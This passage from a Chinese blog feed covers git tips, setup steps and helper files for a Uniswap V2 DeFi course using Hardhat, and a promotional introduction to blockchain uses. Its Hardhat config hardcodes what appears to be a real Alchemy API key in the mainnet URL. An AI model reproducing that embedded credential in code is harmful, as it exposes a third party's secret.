上传后打不开文件夹（出现白箭头）</h3><blockquote><p>这是因为其他工程下有.git文件，Github视其为子系统模块。</p><p>删除文件夹下的.git文件即可</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">git rm --cached &lt;File Name&gt;<br>git add . <br>git commit -m &quot;delete .git&quot;<br>git push<br></code></pre></td></tr></table></figure><h2 id="2-克隆dev分支并合并到main分支"><a href="#2-克隆dev分支并合并到main分支" class="headerlink" title="2. 克隆dev分支并合并到main分支"></a>2. 克隆dev分支并合并到main分支</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">拉取指定分支</span><br>git clone -b dev [git仓库地址]<br><span class="hljs-meta prompt_"># </span><span class="language-bash">为了保险起见，可以将远程master分支pull下来</span><br>git pull<br><span class="hljs-meta prompt_"># </span><span class="language-bash">切换到main分支</span><br>git checkout main<br><span class="hljs-meta prompt_"># </span><span class="language-bash">将分支代码合并到main上</span><br>git merge dev<br>git merge master --allow-unrelated-histories<br><span class="hljs-meta prompt_"># </span><span class="language-bash">在本地合并分支，我们还要将主分支推到远程仓库</span><br>git push origin<br><br> <br></code></pre></td></tr></table></figure><p><strong>附：</strong></p><p><img src="/2022/09/01/Git%E6%93%8D%E4%BD%9C%E7%AE%80%E8%AE%B0/1.png"></p>]]></content>
    
    
    <categories>
      
      <category>基操勿6</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Git-Bash基操</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Part1. Uniswap V2 Start</title>
    <link href="/2022/09/01/Part1.%20Uniswap%20V2%20Start/"/>
    <url>/2022/09/01/Part1.%20Uniswap%20V2%20Start/</url>
    
    <content type="html"><![CDATA[<h1 id="part1-Uniswap-V2-Start"><a href="#part1-Uniswap-V2-Start" class="headerlink" title="part1. Uniswap V2  Start"></a>part1. Uniswap V2  Start</h1><blockquote><p>DEFI 进阶课程 </p><p>这节课将带大家了解Uniswap v2开发的基础模块，以及快速搭建项目</p></blockquote><h2 id="前言（入门）"><a href="#前言（入门）" class="headerlink" title="前言（入门）"></a>前言（入门）</h2><p>在 DeFi (去中心化金融)赛道中，DEX(去中心化交易所) 无疑是最核心的一块，而 <strong>Uniswap</strong> 又是整个 DEX 领域中的龙头，如 <strong>SushiSwap、PancakeSwap</strong> 等都是沿袭了 Uniswap 的。因此我们用Uniswap V2来开启DeFi进阶的课程。</p><h1 id="Uniswap-v2-实现-Defi的基础模块"><a href="#Uniswap-v2-实现-Defi的基础模块" class="headerlink" title="Uniswap v2 实现 Defi的基础模块"></a>Uniswap v2 实现 Defi的基础模块</h1><h2 id="1-v2-Core-核心"><a href="#1-v2-Core-核心" class="headerlink" title="1.v2-Core(核心)"></a>1.v2-Core(核心)</h2><blockquote><p>源码文档<a href="https://github.com/Uniswap/uniswap-v2-core">  Source code</a></p></blockquote><p>核心由一个单例工厂和许多交易对组成，工厂负责创建和索引。这些工厂合约非常少，甚至是极其稀有的。这样做的简单理由是，具有较小表面积的合约更容易推理，更不容易出错，并且在功能上更优雅。也许这种设计的最大优点是系统的许多所需属性可以直接在代码中声明，几乎没有出错的余地。然而，一个缺点是核心合约在某种程度上对用户不友好。事实上，对于大多数用例，不建议直接与这些合约交互。相反，应该使用外部合约进行交互。</p><h3 id="1-1-Factory-工厂"><a href="#1-1-Factory-工厂" class="headerlink" title="1.1 Factory(工厂)"></a>1.1 Factory(工厂)</h3><p><code>0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f</code></p><blockquote><p>参考文档  <a href="https://docs.uniswap.org/protocol/V2/reference/smart-contracts/factory">Reference documentation</a></p></blockquote><p>工厂持有负责为币对供电的通用字节码。它的主要工作是为每个独特的代币对创建一个且只有一个智能合约。它还包含开启协议收费的逻辑。</p><h3 id="1-2-Pairs-交易对"><a href="#1-2-Pairs-交易对" class="headerlink" title="1.2 Pairs(交易对)"></a>1.2 Pairs(交易对)</h3><blockquote><p>参考文档  <a href="https://docs.uniswap.org/protocol/V2/reference/smart-contracts/pair">Reference documentation</a></p></blockquote><p>货币对有两个主要目的：充当自动做市商和跟踪池代币余额。他们还公开了可用于构建去中心化价格预言机的数据。</p><h2 id="2-v2-Periphery-外部活动"><a href="#2-v2-Periphery-外部活动" class="headerlink" title="2. v2-Periphery(外部活动)"></a>2. v2-Periphery(外部活动)</h2><blockquote><p>源码  <a href="https://github.com/Uniswap/uniswap-v2-periphery">Source code</a></p></blockquote><p>外围是<strong>一组</strong>智能合约，包括了Library(库)和Router(路由)，它旨在支持与Core(核心)的特定领域交互。由于 Uniswap 的无许可性质，下面描述的合约没有特权，实际上只是可能的外围类合约宇宙的一小部分。但是，它们是如何安全有效地与 Uniswap V2 交互的有用示例。</p><h3 id="2-1-Library-库"><a href="#2-1-Library-库" class="headerlink" title="2.1 Library(库)"></a>2.1 Library(库)</h3><blockquote><p>参考文档  <a href="https://docs.uniswap.org/protocol/V2/reference/smart-contracts/library">Reference documentation</a></p></blockquote><p>库为获取数据和定价提供了各种便利功能。</p><h3 id="2-2-Router-路由"><a href="#2-2-Router-路由" class="headerlink" title="2.2 Router(路由)"></a>2.2 Router(路由)</h3><p><code>0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D</code></p><blockquote><p>参考文档  <a href="https://docs.uniswap.org/protocol/V2/reference/smart-contracts/router-02">Reference documentation</a></p></blockquote><p>使用该库的路由器完全支持前端提供交易和流动性管理功能的所有基本要求。值得注意的是，它原生支持多对交易（例如 x 到 y 到 z），将 ETH 视为一等公民，并提供元交易以消除流动性。</p><h1 id="快速开始"><a href="#快速开始" class="headerlink" title="快速开始"></a>快速开始</h1><h2 id="环境版本（本教案）"><a href="#环境版本（本教案）" class="headerlink" title="环境版本（本教案）"></a>环境版本（本教案）</h2><ul><li>hardhat  2.10.1</li><li>solidity 0.8.0</li><li>compiler 0.8.0</li></ul><h2 id="创建新文件夹，安全帽初始化"><a href="#创建新文件夹，安全帽初始化" class="headerlink" title="创建新文件夹，安全帽初始化"></a>创建新文件夹，安全帽初始化</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir uniswapDemo<br><br>cd uniswapDemo<br><span class="hljs-meta prompt_">#</span><span class="language-bash">安全帽初始化项目</span><br>npx hardhat<br><span class="hljs-meta prompt_">#</span><span class="language-bash">选择 Create an empty JavaScipt Project</span><br>npm init -y<br><span class="hljs-meta prompt_">#</span><span class="language-bash">创建接口文件夹，以及依赖文件夹</span><br>mkdir contracts/interfaces<br></code></pre></td></tr></table></figure><h2 id="安装必要模块"><a href="#安装必要模块" class="headerlink" title="安装必要模块"></a>安装必要模块</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">项目安装安全帽</span><br>npm install --D hardhat@2.10.1<br><span class="hljs-meta prompt_">#</span><span class="language-bash">安全帽必要模块安装</span><br>npm install --D @nomiclabs/hardhat-waffle chai @nomiclabs/hardhat-ethers ethers <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">安装openzeppelin</span><br>npm install @openzeppelin/contracts<br><span class="hljs-meta prompt_">#</span><span class="language-bash">uniswap v2模块（暂时不用安装）</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">npm i --save @uniswap/v2-core @uniswap/v2-periphery</span><br></code></pre></td></tr></table></figure><p>安装成功后，再进行下列操作，如果安装不成功，请联系助教</p><h2 id="修改hardhat-config-js"><a href="#修改hardhat-config-js" class="headerlink" title="修改hardhat.config.js"></a>修改<code>hardhat.config.js</code></h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;@nomiclabs/hardhat-waffle&quot;</span>);<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MAINNET_URL</span> = <span class="hljs-string">&quot;https://eth-mainnet.g.alchemy.com/v2/WyuB7QMMto4srxT4WPnDkX-vOVYCRv3i&quot;</span>;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">solidity</span>: <span class="hljs-string">&quot;0.8.0&quot;</span>,<br>  <span class="hljs-attr">networks</span>: &#123;<br>    <span class="hljs-attr">hardhat</span>: &#123;<br>      <span class="hljs-attr">forking</span>: &#123;<br>        <span class="hljs-attr">url</span>: <span class="hljs-variable constant_">MAINNET_URL</span><br>      &#125;,<br>      <br>    &#125;<br>  &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h2 id="测试项目编译是否正常"><a href="#测试项目编译是否正常" class="headerlink" title="测试项目编译是否正常"></a>测试项目编译是否正常</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">npx hardhat compile<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">nothing to compile</span><br></code></pre></td></tr></table></figure><h2 id="⭐必要文件-一定要保存"><a href="#⭐必要文件-一定要保存" class="headerlink" title="⭐必要文件(一定要保存)"></a>⭐必要文件(一定要保存)</h2><blockquote><p>这两份文件在之后的每一次样例中都会使用！</p></blockquote><h3 id="config-js"><a href="#config-js" class="headerlink" title="config.js"></a><code>config.js</code></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DAI</span> = <span class="hljs-string">&quot;0x6B175474E89094C44Da98b954EedeAC495271d0F&quot;</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">USDC</span> = <span class="hljs-string">&quot;0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48&quot;</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">USDT</span> = <span class="hljs-string">&quot;0xdAC17F958D2ee523a2206206994597C13D831ec7&quot;</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">WETH</span> = <span class="hljs-string">&quot;0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2&quot;</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">WBTC</span> = <span class="hljs-string">&quot;0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599&quot;</span><br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">WETH_10</span> = <span class="hljs-string">&quot;0xf4BB2e28688e89fCcE3c0580D37d36A7672E8A9F&quot;</span><br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">WETH_WHALE</span>= <span class="hljs-string">&quot;0xee2826453A4Fd5AfeB7ceffeEF3fFA2320081268&quot;</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DAI_WHALE</span>=<span class="hljs-string">&quot;0xF977814e90dA44bFA03b6295A0616a897441aceC&quot;</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">USDC_WHALE</span>=<span class="hljs-string">&quot;0x3f5CE5FBFe3E9af3971dD833D26bA9b5C936f0bE&quot;</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">USDT_WHALE</span>=<span class="hljs-string">&quot;0x3f5CE5FBFe3E9af3971dD833D26bA9b5C936f0bE&quot;</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">WBTC_WHALE</span>=<span class="hljs-string">&quot;0xF977814e90dA44bFA03b6295A0616a897441aceC&quot;</span><br><br><br><span class="hljs-comment">// compound</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CDAI</span> = <span class="hljs-string">&quot;0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643&quot;</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CUSDC</span> = <span class="hljs-string">&quot;0x39AA39c021dfbaE8faC545936693aC917d5E7563&quot;</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CWBTC</span> = <span class="hljs-string">&quot;0xccF4429DB6322D5C611ee964527D42E5d685DD6a&quot;</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CETH</span> = <span class="hljs-string">&quot;0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5&quot;</span><br><br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-variable constant_">DAI</span>,<br>  <span class="hljs-variable constant_">USDC</span>,<br>  <span class="hljs-variable constant_">USDT</span>,<br>  <span class="hljs-variable constant_">WETH</span>,<br>  <span class="hljs-variable constant_">WBTC</span>,<br>  <span class="hljs-variable constant_">WETH_10</span>,<br>  <span class="hljs-variable constant_">DAI_WHALE</span>,<br>  <span class="hljs-variable constant_">USDC_WHALE</span>,<br>  <span class="hljs-variable constant_">USDT_WHALE</span>,<br>  <span class="hljs-variable constant_">WETH_WHALE</span>,<br>  <span class="hljs-variable constant_">WBTC_WHALE</span>,<br>  <span class="hljs-variable constant_">CDAI</span>,<br>  <span class="hljs-variable constant_">CUSDC</span>,<br>  <span class="hljs-variable constant_">CWBTC</span>,<br>  <span class="hljs-variable constant_">CETH</span>,<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="util-js"><a href="#util-js" class="headerlink" title="util.js"></a><code>util.js</code></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">BN</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;bn.js&quot;</span>);<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">ZERO_ADDRESS</span> = <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000&quot;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">cast</span>(<span class="hljs-params">x</span>) &#123;<br>  <span class="hljs-keyword">if</span> (x <span class="hljs-keyword">instanceof</span> <span class="hljs-variable constant_">BN</span>) &#123;<br>    <span class="hljs-keyword">return</span> x;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">BN</span>(x);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">eq</span>(<span class="hljs-params">x, y</span>) &#123;<br>  x = <span class="hljs-title function_">cast</span>(x);<br>  y = <span class="hljs-title function_">cast</span>(y);<br>  <span class="hljs-keyword">return</span> x.<span class="hljs-title function_">eq</span>(y);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">pow</span>(<span class="hljs-params">x, y</span>) &#123;<br>  x = <span class="hljs-title function_">cast</span>(x);<br>  y = <span class="hljs-title function_">cast</span>(y);<br>  <span class="hljs-keyword">return</span> x.<span class="hljs-title function_">pow</span>(y);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">frac</span>(<span class="hljs-params">x, n, d</span>) &#123;<br>  x = <span class="hljs-title function_">cast</span>(x);<br>  n = <span class="hljs-title function_">cast</span>(n);<br>  d = <span class="hljs-title function_">cast</span>(d);<br>  <span class="hljs-keyword">return</span> x.<span class="hljs-title function_">mul</span>(n).<span class="hljs-title function_">div</span>(d);<br>&#125;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-variable constant_">ZERO_ADDRESS</span>,<br>  eq,<br>  pow,<br>  frac,<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="这两个文件都要放在test文件夹里面"><a href="#这两个文件都要放在test文件夹里面" class="headerlink" title="这两个文件都要放在test文件夹里面"></a>这两个文件都要放在<code>test</code>文件夹里面</h3>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
      <category>DeFi</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Uniswap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从入门到搞懂区块链</title>
    <link href="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    <url>/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="🚀从入门开始到搞懂区块链"><a href="#🚀从入门开始到搞懂区块链" class="headerlink" title="🚀从入门开始到搞懂区块链"></a>🚀从入门开始到搞懂<em><strong>区块链</strong></em></h1><blockquote><p> Blog  By  Science_Jun</p></blockquote><h2 id="1-新时代的展望——区块链的价值"><a href="#1-新时代的展望——区块链的价值" class="headerlink" title="1. 新时代的展望——区块链的价值"></a>1. 新时代的展望——区块链的价值</h2><p><strong>A.</strong> 🚀在传统的互联网即信息互联网中，只能够实现信息之间的传播，例如张三把<strong>他今天没吃饭</strong>这件事告诉了李四，但这仅仅是将消息广播出去了而已，却不能够实现<u>价值的传递</u>。大胆设想，一根头发本身没有价值，但通过区块链，张三<strong>用一个比特币</strong>买下了这根头发，那么这根头发现在就被赋予了一个比特币的价值，这就是价值之间的传递。</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/1.png" alt="1"></p><p>​         而在区块链中，恰恰能够<strong>点对点</strong>的解决价值传递的问题。这就是区块链的<strong>第一个价值</strong>所在。</p><hr><p><strong>B.</strong> 🚀<strong>阐述这一价值前，我想问大家一个问题：</strong>当你使用支付宝付款，你的信任基础是什么？是**<u>阿里巴巴</u><strong>这个</strong>企业<strong>，这个</strong>品牌**，还是他背后运行的代码？</p><blockquote><p>我想你内心的答案显而易见 [🐕doge]</p><p>是的，99.99999%的人信任的是品牌，企业，组织而非代码</p></blockquote><p>【信任人或组织的代价是什么？】</p><blockquote><p>人心叵测，想要打造出一个让人信任的企业或者品牌，往往需要与时间和巨额投资赛跑~ ~ 具市场调研，通常至少需要半个爽！！！可以说，成本极其昂贵。Σ(っ °Д °;)っ</p></blockquote><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/2.png" alt="2"></p><p>​         <strong>而</strong>在区块链的世界中，代码就代表着<strong>法律</strong>，它能够做到代码活动的<strong>公开透明性</strong>，从而使执行者在基于代码信任的基础上，实现经济活动。乍一听，这还蛮高深的，其实说白了，区块链就是个<strong>“透视镜”</strong>，在这里，没有暗箱操作，也没有小黑屋，大家都能够监视经济活动的执行。</p><hr><p><strong>C.<strong>🚀关于区块链的</strong>其他价值</strong>，在这里我不过多赘述，后面的教程会详细展开，朋友们直接上图！</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/3.png" alt="3"></p><hr><h2 id="2-不仅仅是数字货币——区块链的应用"><a href="#2-不仅仅是数字货币——区块链的应用" class="headerlink" title="2. 不仅仅是数字货币——区块链的应用"></a>2. 不仅仅是数字货币——区块链的应用</h2><h3 id="💎-区块链应用-行业"><a href="#💎-区块链应用-行业" class="headerlink" title="💎 区块链应用-行业"></a>💎 区块链应用-行业</h3><ol><li><p>🚀<strong>银行业：</strong>银行是一个安全的存储仓库和价值的交换中心，而区块链作为一种数字化的、安全的以及<strong>防篡改的</strong>总账账簿可以达到相同的功效。</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/14.png" alt="14"></p><hr></li><li><p>🚀<strong>医疗业：</strong> 一直以来，医疗机构都要忍受无法在各平台上**<u>安全地共享数据</u><strong>。数据提供商之间更好的数据合作意味着更精确的诊断，更有效的治疗，以及提升医疗系统提供经济划算的医疗服务的整体能力。区块链技术可以让医院、患者和医疗利益链上的各方在区块链网络里</strong>共享数据<strong>，而不必</strong>担忧**数据的安全性和完整性。</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/4.webp" alt="4"></p><hr></li><li><p>🚀<strong>物联网行业：</strong>使用区块链技术形成一个物联网设备去中心化网络的主体。根据部分网站，作为<strong>匿名的去中心化的</strong>点对点遥感技术，区块链可以成为大量设备的一种<strong>公共账簿</strong>，它们将不再需要有一个中央化的 路由在他们之间居中交通。在没有了中央控制系统来验证之后，设备将能够在它们之间互相匿名传输，并管理软件的更新、错误，或者进行能源管理。</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/5.webp" alt="5"></p></li></ol><p>​              <u><strong>不理解没关系，举个例子：区块链+物流链</strong></u></p><ul><li><p>以一直受假冒伪劣产品困扰的茅台酒的防伪技术为例，2000年起，其酒盖里有一个唯一的<em>RFID标签</em>，可通过手机等设备以<em><strong>NFC</strong></em>方式读出，然后通过茅台的APP进行校验，以此防止伪造产品。 <strong>乍一看</strong>，这种防伪效果非常可靠。但2016年还是引爆了茅台酒防伪造假，虽然通过NFC方式验证OK，但经茅台专业人士鉴定为假酒。后来，在<strong>国酒茅台防伪溯源系统</strong>数据库审计中发现<em><strong>80万条假</strong></em>的防伪标签记录💔，原来防伪技术公司人员参与伪造。随后，茅台改用<strong>安全芯片防伪标签</strong>。<strong>然而</strong>，这里暴露出来的痛点并没有解决，即防伪信息掌握在某个中心机构中，有权限的人可以<strong>任意</strong>修改。因此2017年05月贵阳数博会上，马子哥就建议<strong>茅台防伪使用区块链</strong>，<strong>那么区块链和物流链的结合有什么优势呢？</strong></p><hr></li><li><p>🚀以上问题在本节<strong>最后</strong>公布答案，可以自己先思考一下哦😊！！</p></li></ul><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/emoji/5.jpg" alt="5"></p><p>​       </p><ol start="4"><li><p>🚀<strong>房地产行业：</strong>买卖产权的过程中的<strong>痛点</strong>在于：交易过程中和交易后缺乏透明，大量的文书工作，潜在的欺诈行为，公共记录中的错误等等，而这些还仅仅只是一部分。区块链提供了一个途径去实现无纸化和快速交易的需求。房地产区块链应用可以帮助记录、追溯和转移地契、房契、留置权等等，还给金融公司、产权公司和抵押公司提供了一个平台。区块链技术致力于<strong>安全保存文件</strong>，同时增强<strong>透明性</strong>，<strong>降低成本</strong>。</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/6.jpeg" alt="6"></p><hr></li><li><p>🚀<strong>汽车业：</strong>早在2017年，就有<strong>大佬</strong>宣布合伙使用区块链建立一个概念证明来简化汽车租赁过程，并把它建成一个<strong>“点击，签约，和驾驶”</strong>的过程。未来的客户选择他们想要租赁的汽车，<strong>进入区块链的公共总账</strong>；然后，坐在驾驶座上，客户签订租赁协议和保险政策，而区块链则是同步更新信息。 这不是一个想象，对于汽车销售和汽车登记来说，这种类型的过程也可能会发展为现实。</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/7.webp" alt="7"></p><hr></li><li><p>🚀保险业，云存储，股市交易，学术界，能源管理….<strong>只有你想不到的，</strong></p><p><strong>没有区块链技术不能涉及到</strong>的行业👍👍👍<img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/emoji/7.jpg" alt="7" style="zoom:20%;"></p></li></ol><h3 id="💎-区块链应用-具体经典实例"><a href="#💎-区块链应用-具体经典实例" class="headerlink" title="💎 区块链应用-具体经典实例"></a>💎 区块链应用-具体经典实例</h3><ol><li><p><strong>电子身份证（版权保护）：</strong>将“申请人+发布时间+发布内容”等<strong>版权</strong>信息加密后上传，版权信息用于<strong>唯一区块链ID</strong>，相当拥有了一张电子身份证。</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/8.webp" alt="8"></p><ol start="2"><li><p><strong>腾讯公益寻人链（信息共享）：</strong>区块链本身就是需要保持各个节点的数据一致性的，可以说是<strong>自带信息共享</strong>功能；其次，实时的问题通过区块链的<strong>P2P</strong>技术可以实现；最后，利用区块链的<strong>不可篡改和共识机制</strong>，可构建其一条<strong>安全可靠</strong>的信息共享通道。</p><p><img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/true/9.webp" alt="9"></p></li></ol></li><li><p><strong>茅台酒防伪溯源（区块链+物流链）：</strong>上文说到在2017年05月贵阳数博会上，马子哥建议<strong>茅台防伪使用区块链</strong>。<strong>咱们书接上文[doge🐕]:</strong></p><ol><li><p>🚀<strong>去中心化：</strong>区块链没有中心化节点，各节点是平等的，掌握单个节点无法实现修改数据；需要掌控足够多的节点，才可能伪造数据，<em><strong>大大提高伪造数据的成本</strong></em>。</p></li><li><p>🚀<strong>透明可追踪：</strong>区块链天生的开放、透明，使得任何人都可以<em><strong>公开查询</strong></em>，伪造数据被发现的概率大增。</p></li><li><p>🚀<strong>不可篡改和伪造：</strong>区块链的数据不可篡改性，也保证了已销售出去的产品信息已永久记录，无法通过简单复制防伪信息蒙混过关，实现二次销售。</p></li><li><p>🚀<strong>数据安全及信用的自我建立：</strong>物流链的所有节点上区块链后，商品从生产商到消费者手里都有迹可循，形成完整链条；商品缺失的环节越多，将暴露出其是伪劣产品概率更大。</p></li></ol><blockquote> <img src="/2022/08/30/%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%90%9E%E6%87%82%E5%8C%BA%E5%9D%97%E9%93%BE/emoji/2.jpg" alt="2" style="zoom: 25%;"><p> Soga！马子哥诚不欺我！！果然是聪明人！(<em>^_^</em>)</p><p> 有了区块链，再也不用当冤大头喝假酒了！</p></blockquote><hr></li><li><p><strong>数字人民币DECP（P2P价值传递）：</strong>全称<em><strong>Digital Currency Electronic Payment</strong></em>，DC指的是数字货币，EP指的电子支付。早在2014年，央行便开始着手DCEP的研究。2020年已在深圳、苏州、雄安、成都试点。从性质上看，DCEP，属于法定货币，是数字化的纸币，和人民币金额是1:1的关系，没有投资和投机价值。</p><p><img 